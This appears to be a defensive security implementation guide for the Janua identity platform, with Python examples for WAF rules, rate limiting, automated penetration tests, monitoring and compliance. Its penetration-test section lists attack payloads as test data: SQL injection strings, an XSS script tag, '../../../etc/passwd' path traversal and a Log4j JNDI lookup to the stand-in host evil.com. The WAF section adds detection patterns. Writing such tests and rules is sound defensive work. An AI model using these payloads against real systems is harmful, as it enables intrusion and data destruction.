# Security Implementation Guide

Comprehensive guide for implementing enterprise-grade security features in Janua Identity Platform.

## 🎯 Overview

This guide provides detailed implementation instructions for Janua's advanced security features including WAF configuration, penetration testing, rate limiting, and security monitoring.

## 🛡️ Web Application Firewall (WAF)

### WAF Configuration

#### 1. Basic WAF Setup
```python
from app.security.waf import WAFEngine, WAFRule

# Initialize WAF engine
waf = WAFEngine(
    enabled=True,
    log_level="INFO",
    block_suspicious_ips=True,
    geo_blocking_enabled=True
)

# Configure basic rules
waf.add_rule(WAFRule(
    name="sql_injection_protection",
    pattern=r"(union|select|insert|delete|drop|create|alter)\s+",
    action="block",
    severity="high"
))

waf.add_rule(WAFRule(
    name="xss_protection",
    pattern=r"<script[^>]*>.*?</script>",
    action="sanitize",
    severity="medium"
))
```

#### 2. Advanced Threat Detection
```python
# Configure threat scoring
waf.configure_threat_scoring({
    "sql_injection": 90,
    "xss_attempt": 70,
    "path_traversal": 85,
    "command_injection": 95,
    "suspicious_user_agent": 30,
    "multiple_failed_auth": 60
})

# Geo-blocking configuration
waf.configure_geo_blocking({
    "blocked_countries": ["CN", "RU", "KP"],  # ISO country codes
    "allowed_countries": ["US", "CA", "GB", "DE", "FR"],
    "default_action": "challenge"  # block, allow, challenge
})

# IP reputation checking
waf.configure_ip_reputation({
    "enable_reputation_check": True,
    "reputation_sources": ["spamhaus", "malwaredomains", "tor_exit_nodes"],
    "reputation_threshold": 70,
    "action_on_bad_reputation": "block"
})
```

#### 3. Custom WAF Rules
```python
# Custom rule for API protection
class APIProtectionRule(WAFRule):
    def __init__(self):
        super().__init__(
            name="api_protection",
            description="Protect API endpoints from abuse"
        )

    def evaluate(self, request):
        # Check for API abuse patterns
        if request.path.startswith("/api/"):
            # Rate limit per IP
            if self.check_api_rate_limit(request.remote_addr):
                return {"action": "rate_limit", "severity": "medium"}

            # Check for suspicious payloads
            if self.detect_suspicious_payload(request.body):
                return {"action": "block", "severity": "high"}

        return {"action": "allow"}

    def check_api_rate_limit(self, ip_address):
        # Implement rate limiting logic
        current_requests = self.get_request_count(ip_address, window=60)
        return current_requests > 100  # 100 requests per minute

    def detect_suspicious_payload(self, payload):
        suspicious_patterns = [
            r".*\.\./.*",  # Path traversal
            r".*exec\(.*\).*",  # Code execution
            r".*eval\(.*\).*"   # Eval injection
        ]
        return any(re.search(pattern, payload) for pattern in suspicious_patterns)

# Add custom rule to WAF
waf.add_rule(APIProtectionRule())
```

### WAF Monitoring and Alerting

```python
# Configure WAF logging
import structlog

waf_logger = structlog.get_logger("waf")

class WAFLogger:
    def log_threat(self, request, threat_info):
        waf_logger.warning(
            "waf_threat_detected",
            ip=request.remote_addr,
            user_agent=request.headers.get("User-Agent"),
            threat_type=threat_info["type"],
            severity=threat_info["severity"],
            action_taken=threat_info["action"],
            request_path=request.path,
            request_method=request.method
        )

    def log_blocked_request(self, request, reason):
        waf_logger.error(
            "waf_request_blocked",
            ip=request.remote_addr,
            reason=reason,
            request_path=request.path,
            request_body=request.body[:1000]  # First 1000 chars
        )

# Configure real-time alerting
class WAFAlertManager:
    def __init__(self):
        self.alert_thresholds = {
            "high_severity_threats": 5,  # 5 high severity threats in 5 minutes
            "blocked_requests": 50,       # 50 blocked requests in 10 minutes
            "geo_blocks": 20             # 20 geo-blocks in 5 minutes
        }

    async def check_alert_conditions(self):
        # Check for alert conditions every minute
        high_severity_count = await self.get_threat_count(
            severity="high",
            time_window=300  # 5 minutes
        )

        if high_severity_count >= self.alert_thresholds["high_severity_threats"]:
            await self.send_alert({
                "type": "high_severity_threats",
                "count": high_severity_count,
                "message": f"High severity threats detected: {high_severity_count} in last 5 minutes"
            })
```

## 🔒 Advanced Rate Limiting

### Multi-Algorithm Rate Limiting

#### 1. Token Bucket Implementation
```python
from app.security.rate_limiter import AdvancedRateLimiter, TokenBucket

# Configure token bucket rate limiter
rate_limiter = AdvancedRateLimiter()

# API endpoint rate limiting
rate_limiter.add_limit("api_general", TokenBucket(
    capacity=100,           # 100 tokens
    refill_rate=10,        # 10 tokens per second
    window_size=60         # 1 minute window
))

# Authentication rate limiting
rate_limiter.add_limit("auth_attempts", TokenBucket(
    capacity=5,            # 5 attempts
    refill_rate=1,         # 1 attempt per minute
    window_size=300        # 5 minute window
))

# User-specific rate limiting
rate_limiter.add_limit("user_actions", TokenBucket(
    capacity=1000,         # 1000 actions
    refill_rate=50,        # 50 actions per second
    window_size=3600       # 1 hour window
))
```

#### 2. Sliding Window Rate Limiting
```python
from app.security.rate_limiter import SlidingWindowRateLimiter

# Configure sliding window for more precise rate limiting
sliding_limiter = SlidingWindowRateLimiter(
    redis_client=redis_client,
    window_size=60,        # 1 minute
    max_requests=100       # 100 requests per minute
)

async def check_rate_limit(user_id, endpoint):
    key = f"rate_limit:{user_id}:{endpoint}"
    allowed = await sliding_limiter.is_allowed(key)

    if not allowed:
        raise RateLimitExceeded(
            message="Rate limit exceeded",
            retry_after=await sliding_limiter.get_retry_after(key)
        )
```

#### 3. Adaptive Rate Limiting
```python
class AdaptiveRateLimiter:
    def __init__(self):
        self.base_limits = {
            "free_user": 100,
            "premium_user": 1000,
            "enterprise_user": 10000
        }
        self.reputation_multipliers = {
            "excellent": 1.5,
            "good": 1.0,
            "fair": 0.7,
            "poor": 0.3
        }

    async def get_user_limit(self, user_id):
        user = await self.get_user(user_id)
        base_limit = self.base_limits.get(user.plan, 100)

        # Adjust based on user reputation
        reputation = await self.get_user_reputation(user_id)
        multiplier = self.reputation_multipliers.get(reputation, 1.0)

        # Adjust based on system load
        system_load = await self.get_system_load()
        if system_load > 0.8:  # High load
            multiplier *= 0.5

        return int(base_limit * multiplier)

    async def get_user_reputation(self, user_id):
        # Calculate reputation based on:
        # - Authentication success rate
        # - API usage patterns
        # - Security incidents
        auth_success_rate = await self.get_auth_success_rate(user_id)
        incident_count = await self.get_security_incidents(user_id)

        if auth_success_rate > 0.95 and incident_count == 0:
            return "excellent"
        elif auth_success_rate > 0.85 and incident_count < 3:
            return "good"
        elif auth_success_rate > 0.70 and incident_count < 10:
            return "fair"
        else:
            return "poor"
```

### Rate Limiting Middleware

```python
from fastapi import Request, HTTPException

class RateLimitMiddleware:
    def __init__(self, rate_limiter: AdvancedRateLimiter):
        self.rate_limiter = rate_limiter

    async def __call__(self, request: Request, call_next):
        # Extract user identity
        user_id = await self.extract_user_id(request)
        ip_address = request.client.host
        endpoint = f"{request.method}:{request.url.path}"

        # Check multiple rate limit dimensions
        checks = [
            ("user", user_id),
            ("ip", ip_address),
            ("endpoint", endpoint),
            ("global", "all")
        ]

        for limit_type, identifier in checks:
            result = await self.rate_limiter.check_limit(
                limit_name=f"{limit_type}_limit",
                identifier=identifier
            )

            if not result.allowed:
                raise HTTPException(
                    status_code=429,
                    detail="Rate limit exceeded",
                    headers={
                        "Retry-After": str(result.retry_after),
                        "X-RateLimit-Limit": str(result.limit),
                        "X-RateLimit-Remaining": str(result.remaining),
                        "X-RateLimit-Reset": str(result.reset_time)
                    }
                )

        response = await call_next(request)

        # Add rate limit headers to response
        if user_id:
            user_limit_info = await self.rate_limiter.get_limit_info("user_limit", user_id)
            response.headers["X-RateLimit-Limit"] = str(user_limit_info.limit)
            response.headers["X-RateLimit-Remaining"] = str(user_limit_info.remaining)

        return response
```

## 🔍 Penetration Testing Framework

### Automated Security Testing

#### 1. Authentication Security Tests
```python
from app.security.pen_test_framework import PenetrationTestSuite

class AuthenticationSecurityTests:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.test_suite = PenetrationTestSuite()

    async def run_authentication_tests(self):
        results = {}

        # Test 1: Brute force protection
        results["brute_force"] = await self.test_brute_force_protection()

        # Test 2: SQL injection in login
        results["sql_injection"] = await self.test_sql_injection_login()

        # Test 3: Session security
        results["session_security"] = await self.test_session_security()

        # Test 4: Password policy enforcement
        results["password_policy"] = await self.test_password_policy()

        # Test 5: MFA bypass attempts
        results["mfa_bypass"] = await self.test_mfa_bypass()

        return results

    async def test_brute_force_protection(self):
        """Test brute force protection mechanisms"""
        test_email = "test@example.com"
        test_password = "wrongpassword"

        for attempt in range(10):
            response = await self.make_login_request(test_email, test_password)

            if attempt >= 5 and response.status_code != 429:
                return {
                    "status": "FAIL",
                    "message": "Brute force protection not activated after 5 attempts",
                    "attempt": attempt + 1
                }

        return {
            "status": "PASS",
            "message": "Brute force protection working correctly"
        }

    async def test_sql_injection_login(self):
        """Test SQL injection vulnerabilities in login"""
        sql_payloads = [
            "admin'--",
            "admin' OR '1'='1",
            "admin'; DROP TABLE users; --",
            "admin' UNION SELECT * FROM users --"
        ]

        for payload in sql_payloads:
            response = await self.make_login_request(payload, "password")

            if response.status_code == 200:
                return {
                    "status": "FAIL",
                    "message": f"SQL injection vulnerability detected with payload: {payload}",
                    "payload": payload
                }

        return {
            "status": "PASS",
            "message": "No SQL injection vulnerabilities detected"
        }

    async def test_session_security(self):
        """Test session management security"""
        # Create a session
        login_response = await self.make_valid_login()
        session_token = login_response.json()["access_token"]

        tests = {}

        # Test session fixation
        tests["session_fixation"] = await self.test_session_fixation(session_token)

        # Test session hijacking protection
        tests["session_hijacking"] = await self.test_session_hijacking(session_token)

        # Test session timeout
        tests["session_timeout"] = await self.test_session_timeout(session_token)

        return tests
```

#### 2. API Security Tests
```python
class APISecurityTests:
    async def test_api_endpoints(self):
        """Comprehensive API security testing"""
        results = {}

        # Test CORS configuration
        results["cors"] = await self.test_cors_configuration()

        # Test input validation
        results["input_validation"] = await self.test_input_validation()

        # Test authorization bypass
        results["authorization_bypass"] = await self.test_authorization_bypass()

        # Test CSRF protection
        results["csrf_protection"] = await self.test_csrf_protection()

        return results

    async def test_input_validation(self):
        """Test input validation on API endpoints"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j injection
        ]

        endpoints = [
            "/api/users",
            "/api/organizations",
            "/api/auth/signin"
        ]

        for endpoint in endpoints:
            for malicious_input in malicious_inputs:
                payload = {"name": malicious_input, "email": malicious_input}
                response = await self.make_api_request("POST", endpoint, payload)

                if malicious_input in response.text:
                    return {
                        "status": "FAIL",
                        "message": f"Input validation failed for {endpoint}",
                        "payload": malicious_input
                    }

        return {"status": "PASS", "message": "Input validation working correctly"}

    async def test_authorization_bypass(self):
        """Test for authorization bypass vulnerabilities"""
        # Create normal user session
        user_token = await self.get_user_token()

        # Try to access admin endpoints
        admin_endpoints = [
            "/api/admin/users",
            "/api/admin/organizations",
            "/api/admin/settings"
        ]

        for endpoint in admin_endpoints:
            response = await self.make_authenticated_request(
                "GET", endpoint, user_token
            )

            if response.status_code == 200:
                return {
                    "status": "FAIL",
                    "message": f"Authorization bypass detected on {endpoint}",
                    "endpoint": endpoint
                }

        return {"status": "PASS", "message": "Authorization working correctly"}
```

#### 3. Infrastructure Security Tests
```python
class InfrastructureSecurityTests:
    async def test_ssl_configuration(self):
        """Test SSL/TLS configuration"""
        import ssl
        import socket

        hostname = "api.janua.dev"
        port = 443

        context = ssl.create_default_context()

        try:
            with socket.create_connection((hostname, port)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cipher = ssock.cipher()
                    cert = ssock.getpeercert()

                    # Check cipher strength
                    if cipher[2] < 256:
                        return {
                            "status": "FAIL",
                            "message": f"Weak cipher detected: {cipher[0]}"
                        }

                    # Check certificate validity
                    import datetime
                    not_after = datetime.datetime.strptime(
                        cert['notAfter'], '%b %d %H:%M:%S %Y %Z'
                    )

                    if not_after < datetime.datetime.now():
                        return {
                            "status": "FAIL",
                            "message": "SSL certificate expired"
                        }

        except Exception as e:
            return {
                "status": "FAIL",
                "message": f"SSL connection failed: {str(e)}"
            }

        return {"status": "PASS", "message": "SSL configuration secure"}

    async def test_security_headers(self):
        """Test security headers"""
        response = await self.make_request("GET", "/")

        required_headers = {
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Content-Security-Policy": "default-src 'self'"
        }

        missing_headers = []
        weak_headers = []

        for header, expected_value in required_headers.items():
            if header not in response.headers:
                missing_headers.append(header)
            elif not self.validate_header_strength(header, response.headers[header]):
                weak_headers.append(header)

        if missing_headers or weak_headers:
            return {
                "status": "FAIL",
                "message": "Security headers issues detected",
                "missing_headers": missing_headers,
                "weak_headers": weak_headers
            }

        return {"status": "PASS", "message": "Security headers configured correctly"}
```

### Continuous Security Testing

```python
class ContinuousSecurityTesting:
    def __init__(self):
        self.test_schedule = {
            "daily": [
                "authentication_tests",
                "basic_api_tests"
            ],
            "weekly": [
                "comprehensive_api_tests",
                "infrastructure_tests"
            ],
            "monthly": [
                "full_penetration_test",
                "compliance_scan"
            ]
        }

    async def run_scheduled_tests(self, frequency: str):
        """Run security tests based on schedule"""
        tests_to_run = self.test_schedule.get(frequency, [])
        results = {}

        for test_name in tests_to_run:
            try:
                test_result = await self.run_test(test_name)
                results[test_name] = test_result

                # Send alerts for failed tests
                if test_result["status"] == "FAIL":
                    await self.send_security_alert(test_name, test_result)

            except Exception as e:
                results[test_name] = {
                    "status": "ERROR",
                    "message": f"Test execution failed: {str(e)}"
                }

        return results

    async def send_security_alert(self, test_name: str, result: dict):
        """Send security alert for failed tests"""
        alert_message = {
            "severity": "HIGH",
            "test_name": test_name,
            "status": result["status"],
            "message": result["message"],
            "timestamp": datetime.utcnow().isoformat(),
            "requires_immediate_attention": True
        }

        # Send to security team
        await self.send_alert_notification(alert_message)

        # Create security incident ticket
        await self.create_security_incident(alert_message)
```

## 🚨 Security Monitoring & Incident Response

### Real-time Security Monitoring

```python
class SecurityMonitor:
    def __init__(self):
        self.alert_rules = [
            {
                "name": "multiple_failed_logins",
                "condition": "failed_login_count > 5 in 5m",
                "severity": "HIGH",
                "action": "block_ip"
            },
            {
                "name": "privilege_escalation",
                "condition": "role_change AND target_role = 'admin'",
                "severity": "CRITICAL",
                "action": "alert_security_team"
            },
            {
                "name": "unusual_api_access",
                "condition": "api_calls > normal_pattern * 3",
                "severity": "MEDIUM",
                "action": "rate_limit"
            }
        ]

    async def monitor_security_events(self):
        """Continuous security event monitoring"""
        while True:
            try:
                # Check for security anomalies
                anomalies = await self.detect_anomalies()

                for anomaly in anomalies:
                    await self.process_security_anomaly(anomaly)

                # Evaluate alert rules
                await self.evaluate_alert_rules()

                # Update threat intelligence
                await self.update_threat_intelligence()

                await asyncio.sleep(30)  # Check every 30 seconds

            except Exception as e:
                logger.error(f"Security monitoring error: {e}")
                await asyncio.sleep(60)  # Back off on error

    async def detect_anomalies(self):
        """Detect security anomalies using ML models"""
        # Get recent activity data
        activity_data = await self.get_recent_activity()

        # Run anomaly detection
        anomalies = []

        # Geographic anomaly detection
        geo_anomalies = await self.detect_geographic_anomalies(activity_data)
        anomalies.extend(geo_anomalies)

        # Time-based anomaly detection
        time_anomalies = await self.detect_time_anomalies(activity_data)
        anomalies.extend(time_anomalies)

        # Behavioral anomaly detection
        behavior_anomalies = await self.detect_behavioral_anomalies(activity_data)
        anomalies.extend(behavior_anomalies)

        return anomalies
```

### Incident Response Automation

```python
class IncidentResponseSystem:
    def __init__(self):
        self.response_playbooks = {
            "brute_force_attack": self.handle_brute_force,
            "privilege_escalation": self.handle_privilege_escalation,
            "data_exfiltration": self.handle_data_exfiltration,
            "malware_detected": self.handle_malware_detection
        }

    async def handle_security_incident(self, incident):
        """Automated incident response"""
        incident_type = incident["type"]
        severity = incident["severity"]

        # Log incident
        await self.log_security_incident(incident)

        # Execute appropriate playbook
        if incident_type in self.response_playbooks:
            await self.response_playbooks[incident_type](incident)

        # Notify security team based on severity
        if severity in ["HIGH", "CRITICAL"]:
            await self.notify_security_team(incident)

        # Create incident ticket
        ticket_id = await self.create_incident_ticket(incident)

        return {"ticket_id": ticket_id, "status": "incident_handled"}

    async def handle_brute_force(self, incident):
        """Handle brute force attack"""
        source_ip = incident["source_ip"]
        target_user = incident["target_user"]

        # Block source IP
        await self.block_ip_address(source_ip, duration=3600)  # 1 hour

        # Lock target user account temporarily
        await self.lock_user_account(target_user, duration=1800)  # 30 minutes

        # Increase monitoring for similar patterns
        await self.increase_monitoring_sensitivity("brute_force", duration=7200)

        # Send immediate alert
        await self.send_immediate_alert({
            "type": "brute_force_blocked",
            "source_ip": source_ip,
            "target_user": target_user,
            "actions_taken": ["ip_blocked", "account_locked"]
        })

    async def handle_privilege_escalation(self, incident):
        """Handle privilege escalation attempt"""
        user_id = incident["user_id"]
        attempted_role = incident["attempted_role"]

        # Immediately revoke elevated permissions
        await self.revoke_user_permissions(user_id)

        # Force re-authentication
        await self.force_user_reauth(user_id)

        # Flag account for security review
        await self.flag_account_for_review(user_id, reason="privilege_escalation_attempt")

        # Alert security team immediately
        await self.send_critical_alert({
            "type": "privilege_escalation",
            "user_id": user_id,
            "attempted_role": attempted_role,
            "immediate_action_required": True
        })
```

## 🔐 Compliance & Audit

### SOC 2 Type II Compliance

```python
class SOC2ComplianceManager:
    def __init__(self):
        self.compliance_controls = {
            "CC6.1": "logical_access_controls",
            "CC6.2": "authentication_controls",
            "CC6.3": "authorization_controls",
            "CC6.6": "data_classification",
            "CC6.7": "system_monitoring"
        }

    async def generate_compliance_report(self, period_start, period_end):
        """Generate SOC 2 compliance evidence"""
        report = {}

        for control_id, control_name in self.compliance_controls.items():
            evidence = await self.collect_control_evidence(
                control_name, period_start, period_end
            )
            report[control_id] = evidence

        return report

    async def collect_control_evidence(self, control_name, start_date, end_date):
        """Collect evidence for specific control"""
        if control_name == "logical_access_controls":
            return await self.collect_access_control_evidence(start_date, end_date)
        elif control_name == "authentication_controls":
            return await self.collect_auth_control_evidence(start_date, end_date)
        # ... other controls

    async def collect_access_control_evidence(self, start_date, end_date):
        """Collect evidence for logical access controls"""
        evidence = {
            "user_access_reviews": await self.get_access_reviews(start_date, end_date),
            "privilege_escalations": await self.get_privilege_changes(start_date, end_date),
            "failed_access_attempts": await self.get_failed_access_attempts(start_date, end_date),
            "system_access_logs": await self.get_access_logs(start_date, end_date)
        }

        return evidence
```

### GDPR Compliance Tools

```python
class GDPRComplianceTools:
    async def handle_data_subject_request(self, request_type, user_email):
        """Handle GDPR data subject requests"""
        if request_type == "access":
            return await self.export_user_data(user_email)
        elif request_type == "portability":
            return await self.export_portable_data(user_email)
        elif request_type == "erasure":
            return await self.delete_user_data(user_email)
        elif request_type == "rectification":
            return await self.update_user_data(user_email)

    async def export_user_data(self, user_email):
        """Export all user data for GDPR access request"""
        user = await self.get_user_by_email(user_email)

        if not user:
            return {"error": "User not found"}

        user_data = {
            "personal_information": {
                "email": user.email,
                "first_name": user.first_name,
                "last_name": user.last_name,
                "created_at": user.created_at.isoformat(),
                "updated_at": user.updated_at.isoformat()
            },
            "authentication_data": await self.get_auth_data(user.id),
            "session_data": await self.get_session_data(user.id),
            "audit_logs": await self.get_user_audit_logs(user.id),
            "organization_memberships": await self.get_organization_memberships(user.id)
        }

        return user_data

    async def delete_user_data(self, user_email):
        """Delete user data for GDPR erasure request"""
        user = await self.get_user_by_email(user_email)

        if not user:
            return {"error": "User not found"}

        # Anonymize instead of hard delete for audit trail
        anonymized_data = {
            "email": f"deleted-{user.id}@anonymized.local",
            "first_name": "DELETED",
            "last_name": "DELETED",
            "profile_image_url": None,
            "bio": None,
            "phone_number": None,
            "deleted_at": datetime.utcnow(),
            "deletion_reason": "GDPR_ERASURE_REQUEST"
        }

        await self.anonymize_user_data(user.id, anonymized_data)

        return {"status": "User data anonymized successfully"}
```

## 📊 Security Metrics & Reporting

### Security Dashboard Metrics

```python
class SecurityMetrics:
    async def generate_security_dashboard(self):
        """Generate security metrics for dashboard"""
        metrics = {
            "threat_detection": await self.get_threat_metrics(),
            "authentication": await self.get_auth_metrics(),
            "access_control": await self.get_access_metrics(),
            "compliance": await self.get_compliance_metrics(),
            "incidents": await self.get_incident_metrics()
        }

        return metrics

    async def get_threat_metrics(self):
        """Get threat detection metrics"""
        return {
            "threats_detected_24h": await self.count_threats(hours=24),
            "threats_blocked_24h": await self.count_blocked_threats(hours=24),
            "threat_detection_rate": await self.calculate_detection_rate(),
            "false_positive_rate": await self.calculate_false_positive_rate(),
            "top_threat_types": await self.get_top_threat_types(),
            "geographic_threats": await self.get_geographic_threat_distribution()
        }

    async def get_auth_metrics(self):
        """Get authentication metrics"""
        return {
            "successful_logins_24h": await self.count_successful_logins(hours=24),
            "failed_logins_24h": await self.count_failed_logins(hours=24),
            "mfa_adoption_rate": await self.calculate_mfa_adoption(),
            "password_reset_requests": await self.count_password_resets(hours=24),
            "suspicious_login_attempts": await self.count_suspicious_logins(hours=24)
        }
```

---

## 📚 Additional Security Resources

### Security Best Practices
- [OWASP Security Guidelines](https://owasp.org/www-project-top-ten/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CIS Controls](https://www.cisecurity.org/controls/)

### Compliance Resources
- [SOC 2 Type II Audit Guide](https://docs.janua.dev/compliance/soc2)
- [GDPR Compliance Checklist](https://docs.janua.dev/compliance/gdpr)
- [HIPAA Security Requirements](https://docs.janua.dev/compliance/hipaa)

### Emergency Contacts
- **Security Team**: [security@madfam.io](mailto:security@madfam.io)
- **Incident Response**: [incident@janua.dev](mailto:incident@janua.dev)
- **Compliance Team**: [compliance@janua.dev](mailto:compliance@janua.dev)

---

*For additional security implementation support, contact our security team at [security@madfam.io](mailto:security@madfam.io)*